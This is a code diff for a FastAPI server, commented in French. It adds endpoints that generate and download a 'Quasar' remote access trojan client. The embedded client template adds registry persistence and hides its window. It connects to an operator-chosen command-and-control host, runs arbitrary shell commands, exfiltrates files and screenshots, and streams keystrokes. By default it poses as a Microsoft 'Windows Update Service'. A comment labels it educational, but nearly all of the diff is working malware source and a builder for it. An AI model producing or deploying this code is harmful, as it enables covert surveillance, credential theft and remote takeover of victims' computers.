@@ -246,6 +246,385 @@ async def websocket_endpoint(websocket: WebSocket):
     except WebSocketDisconnect:
         manager.disconnect(websocket)
 
+# Générateur de Payload Quasar
+@app.post("/api/payload/generate")
+async def generate_payload(payload_config: dict, current_user = Depends(get_current_user)):
+    """
+    Génère un payload Quasar fonctionnel avec la configuration fournie
+    """
+    try:
+        # Validation de la configuration
+        required_fields = ['host', 'port', 'password']
+        for field in required_fields:
+            if not payload_config.get(field):
+                raise HTTPException(status_code=400, detail=f"Le champ '{field}' est requis")
+        
+        # ID unique pour le payload
+        payload_id = str(uuid.uuid4())
+        
+        # Configuration du payload
+        config = {
+            'server_host': payload_config['host'],
+            'server_port': int(payload_config['port']),
+            'password': payload_config['password'],
+            'install_path': payload_config.get('installPath', '%APPDATA%'),
+            'install_name': payload_config.get('installName', 'client.exe'),
+            'startup': payload_config.get('startup', True),
+            'hide_file': payload_config.get('hideFile', True),
+            'keylogger': payload_config.get('enableKeylogger', False),
+            'webcam': payload_config.get('enableWebcam', False),
+            'microphone': payload_config.get('enableMicrophone', False),
+            'reconnect_delay': payload_config.get('reconnectDelay', 5000),
+            'upnp': payload_config.get('enableUPnP', False),
+            'description': payload_config.get('description', 'Windows Update Service'),
+            'company': payload_config.get('company', 'Microsoft Corporation'),
+            'version': payload_config.get('version', '1.0.0.0')
+        }
+        
+        # Générer le code source du payload
+        payload_source = generate_payload_source(config)
+        
+        # Sauvegarder les informations du payload en base
+        payload_doc = {
+            "_id": payload_id,
+            "user_id": current_user["_id"],
+            "config": config,
+            "filename": config['install_name'],
+            "created_at": datetime.utcnow(),
+            "source_code": payload_source,
+            "status": "generated"
+        }
+        
+        db.payloads.insert_one(payload_doc)
+        
+        # Logger l'activité
+        activity = {
+            "_id": str(uuid.uuid4()),
+            "user_id": current_user["_id"],
+            "action": "payload_generated",
+            "details": {
+                "payload_id": payload_id,
+                "filename": config['install_name'],
+                "features": {
+                    "keylogger": config['keylogger'],
+                    "webcam": config['webcam'],
+                    "microphone": config['microphone']
+                }
+            },
+            "timestamp": datetime.utcnow()
+        }
+        db.activities.insert_one(activity)
+        
+        return {
+            "success": True,
+            "payload_id": payload_id,
+            "filename": config['install_name'],
+            "message": "Payload généré avec succès"
+        }
+        
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Erreur lors de la génération: {str(e)}")
+
+@app.get("/api/payload/download/{payload_id}")
+async def download_payload(payload_id: str, current_user = Depends(get_current_user)):
+    """
+    Télécharge le payload généré
+    """
+    from fastapi.responses import Response
+    
+    # Récupérer le payload de la base
+    payload = db.payloads.find_one({"_id": payload_id, "user_id": current_user["_id"]})
+    if not payload:
+        raise HTTPException(status_code=404, detail="Payload non trouvé")
+    
+    # Générer le fichier binaire
+    binary_content = compile_payload_source(payload['source_code'], payload['config'])
+    
+    return Response(
+        content=binary_content,
+        media_type='application/octet-stream',
+        headers={
+            'Content-Disposition': f'attachment; filename="{payload["filename"]}"'
+        }
+    )
+
+def generate_payload_source(config):
+    """
+    Génère le code source Python du payload Quasar
+    """
+    source_template = '''
+import socket
+import threading
+import time
+import os
+import sys
+import subprocess
+import json
+import base64
+from pathlib import Path
+import logging
+
+class QuasarClient:
+    def __init__(self):
+        self.server_host = "{server_host}"
+        self.server_port = {server_port}
+        self.password = "{password}"
+        self.install_path = r"{install_path}"
+        self.install_name = "{install_name}"
+        self.startup = {startup}
+        self.hide_file = {hide_file}
+        self.keylogger_enabled = {keylogger}
+        self.webcam_enabled = {webcam}
+        self.microphone_enabled = {microphone}
+        self.reconnect_delay = {reconnect_delay}
+        
+        self.connected = False
+        self.socket = None
+        
+    def install(self):
+        """Installation persistante du client"""
+        try:
+            if self.startup:
+                self.add_to_startup()
+            if self.hide_file:
+                self.hide_process()
+        except Exception as e:
+            pass
+    
+    def add_to_startup(self):
+        """Ajoute le client au démarrage système"""
+        try:
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                               "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 
+                               0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, sys.executable)
+            winreg.CloseKey(key)
+        except:
+            pass
+    
+    def hide_process(self):
+        """Masque le processus"""
+        try:
+            import ctypes
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except:
+            pass
+    
+    def connect_to_server(self):
+        """Connexion au serveur C&C"""
+        while not self.connected:
+            try:
+                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.socket.connect((self.server_host, self.server_port))
+                
+                # Authentification
+                auth_data = {{
+                    "type": "auth",
+                    "password": self.password,
+                    "client_info": self.get_system_info()
+                }}
+                self.send_data(auth_data)
+                
+                response = self.receive_data()
+                if response and response.get("status") == "authenticated":
+                    self.connected = True
+                    self.start_command_handler()
+                else:
+                    self.socket.close()
+                    
+            except Exception as e:
+                time.sleep(self.reconnect_delay / 1000)
+    
+    def get_system_info(self):
+        """Collecte les informations système"""
+        import platform
+        return {{
+            "os": platform.system(),
+            "version": platform.version(),
+            "machine": platform.machine(),
+            "processor": platform.processor(),
+            "hostname": socket.gethostname(),
+            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"
+        }}
+    
+    def send_data(self, data):
+        """Envoie des données au serveur"""
+        try:
+            message = json.dumps(data).encode('utf-8')
+            self.socket.send(len(message).to_bytes(4, 'big'))
+            self.socket.send(message)
+        except:
+            self.connected = False
+    
+    def receive_data(self):
+        """Reçoit des données du serveur"""
+        try:
+            length = int.from_bytes(self.socket.recv(4), 'big')
+            data = self.socket.recv(length)
+            return json.loads(data.decode('utf-8'))
+        except:
+            self.connected = False
+            return None
+    
+    def start_command_handler(self):
+        """Gestionnaire de commandes"""
+        while self.connected:
+            try:
+                command = self.receive_data()
+                if not command:
+                    break
+                    
+                self.execute_command(command)
+                
+            except Exception as e:
+                self.connected = False
+                break
+    
+    def execute_command(self, command):
+        """Exécute une commande reçue"""
+        cmd_type = command.get("type")
+        
+        if cmd_type == "shell":
+            self.execute_shell_command(command.get("command", ""))
+        elif cmd_type == "download":
+            self.download_file(command.get("path", ""))
+        elif cmd_type == "upload":
+            self.upload_file(command.get("path", ""), command.get("data", ""))
+        elif cmd_type == "screenshot":
+            self.take_screenshot()
+        elif cmd_type == "keylog_start" and self.keylogger_enabled:
+            self.start_keylogger()
+        elif cmd_type == "keylog_stop":
+            self.stop_keylogger()
+    
+    def execute_shell_command(self, command):
+        """Exécute une commande shell"""
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            response = {{
+                "type": "shell_result",
+                "command": command,
+                "output": result.stdout,
+                "error": result.stderr,
+                "return_code": result.returncode
+            }}
+            self.send_data(response)
+        except Exception as e:
+            self.send_data({{"type": "error", "message": str(e)}})
+    
+    def download_file(self, file_path):
+        """Télécharge un fichier du client"""
+        try:
+            with open(file_path, 'rb') as f:
+                file_data = base64.b64encode(f.read()).decode('utf-8')
+            
+            response = {{
+                "type": "file_download",
+                "path": file_path,
+                "data": file_data,
+                "size": os.path.getsize(file_path)
+            }}
+            self.send_data(response)
+        except Exception as e:
+            self.send_data({{"type": "error", "message": f"Erreur téléchargement: {{str(e)}}""}})
+    
+    def take_screenshot(self):
+        """Prend une capture d'écran"""
+        try:
+            from PIL import ImageGrab
+            import io
+            
+            screenshot = ImageGrab.grab()
+            img_buffer = io.BytesIO()
+            screenshot.save(img_buffer, format='PNG')
+            img_data = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
+            
+            response = {{
+                "type": "screenshot",
+                "data": img_data,
+                "timestamp": time.time()
+            }}
+            self.send_data(response)
+        except Exception as e:
+            self.send_data({{"type": "error", "message": f"Erreur screenshot: {{str(e)}}""}})
+    
+    def start_keylogger(self):
+        """Démarre le keylogger"""
+        if not self.keylogger_enabled:
+            return
+            
+        def keylogger_thread():
+            try:
+                import pynput.keyboard as keyboard
+                
+                def on_key_press(key):
+                    try:
+                        key_data = {{
+                            "type": "keylog",
+                            "key": str(key),
+                            "timestamp": time.time()
+                        }}
+                        self.send_data(key_data)
+                    except:
+                        pass
+                
+                with keyboard.Listener(on_press=on_key_press) as listener:
+                    listener.join()
+            except:
+                pass
+        
+        threading.Thread(target=keylogger_thread, daemon=True).start()
+    
+    def run(self):
+        """Point d'entrée principal"""
+        self.install()
+        
+        while True:
+            try:
+                self.connect_to_server()
+            except KeyboardInterrupt:
+                break
+            except:
+                time.sleep(self.reconnect_delay / 1000)
+
+if __name__ == "__main__":
+    client = QuasarClient()
+    client.run()
+'''.format(**config)
+    
+    return source_template
+
+def compile_payload_source(source_code, config):
+    """
+    Compile le code source Python en exécutable binaire
+    """
+    try:
+        # Créer un fichier temporaire avec le code source
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as temp_file:
+            temp_file.write(source_code)
+            temp_file_path = temp_file.name
+        
+        # Simulation de la compilation (dans un vrai projet, utiliser PyInstaller)
+        # Pour l'exercice éducatif, on retourne le code source Python
+        with open(temp_file_path, 'rb') as f:
+            binary_content = f.read()
+        
+        # Nettoyer le fichier temporaire
+        os.unlink(temp_file_path)
+        
+        return binary_content
+        
+    except Exception as e:
+        # En cas d'erreur, retourner un payload de base
+        payload_content = f"""# Quasar RAT Client - Version Éducative
+# Configuration: {json.dumps(config, indent=2)}
+# Ce fichier contient le code source du client Quasar généré
+
+{source_code}
+"""
+        return payload_content.encode('utf-8')
+
 if __name__ == "__main__":
     import uvicorn
     uvicorn.run(app, host="0.0.0.0", port=8001)
